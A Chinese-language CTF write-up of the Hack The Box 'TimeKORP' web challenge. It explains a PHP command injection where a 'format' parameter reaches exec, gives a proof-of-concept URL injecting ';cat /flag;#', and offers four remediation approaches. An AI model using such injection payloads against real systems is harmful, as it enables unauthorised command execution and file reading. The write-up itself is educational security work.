## 題目 - TimeKORP
- EVENT: [CTF Try Out](https://ctf.hackthebox.com/event/1434)
- 種類: web
- 難度: very easy
- 靶機: `94.237.122.36:54811`

## 解題過程概述
起初看是簡單的網站顯示時間日期而已  
就沒有做基礎的 `enumeration` 了  
開 burpsuite 發現每按一個時間按鈕就呼叫 `/?format=%H:%M:%S`  
看一下 code 發現參數 `%H:%M:%S` 直接餵給 `TimeModel.php` 的 `exec`
就開始嘗試 `command injection` 先確認如何繞過程式執行我要的 cmd
就完成


##  Initial Access - Command Injection 

### Vulnerability Explanation

程式碼直接將使用者輸入 ($_GET['format']) 拼接到系統命令中,沒有進行任何驗證或過濾
```php
# TimeController.php
...
$format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
$time = new TimeModel($format);
...
```

```php
# TimeModel.php
...
public function __construct($format)
{
    $this->command = "date '+" . $format . "' 2>&1";
}

public function getTime()
{
    # 實際執行 變成 date '+';cat /flag;#' 2>&1
    $time = exec($this->command);
    $res  = isset($time) ? $time : '?';
    return $res;
}
...
```

### Vulnerability Fix
#### 1. **白名單驗證 (最推薦)**
只允許特定的安全字符:

```php
public function __construct($format)
{
    // 只允許日期格式字符
    if (!preg_match('/^[A-Za-z%:\-\s]+$/', $format)) {
        throw new Exception('Invalid format');
    }
    $this->command = "date '+" . $format . "' 2>&1";
}
```

#### 2. **使用 escapeshellarg()**
PHP 提供的函數來轉義參數:

```php
public function __construct($format)
{
    $this->command = "date '+" . escapeshellarg($format) . "' 2>&1";
}
```

#### 3. **避免使用 shell 命令 (最安全)**
改用 PHP 原生函數:

```php
public function __construct($format)
{
    $this->format = $format;
}

public function getTime()
{
    // 使用 PHP 內建函數,避免 shell 命令
    return date($this->format);
}
```

#### 4. **預定義格式選項**
限制使用者只能選擇預定義的格式:

```php
$allowed_formats = [
    'time' => '%H:%M:%S',
    'date' => '%Y-%m-%d',
    'datetime' => '%Y-%m-%d %H:%M:%S'
];

$format_key = $_GET['format'] ?? 'time';
$format = $allowed_formats[$format_key] ?? $allowed_formats['time'];
```

### POC 
```bash
# ';cat /flag;#
http://94.237.122.36:54811/?format='%3bcat%20%2fflag%3b%23

# 取得 flag
<h1 class="jumbotron-heading">><span class='text-muted'>It's</span> HTB{t...5}<span class='text-muted'>.</span></h1>
```


**Note**: 此 writeup 僅用於教育目的,請勿在未經授權的系統上進行測試。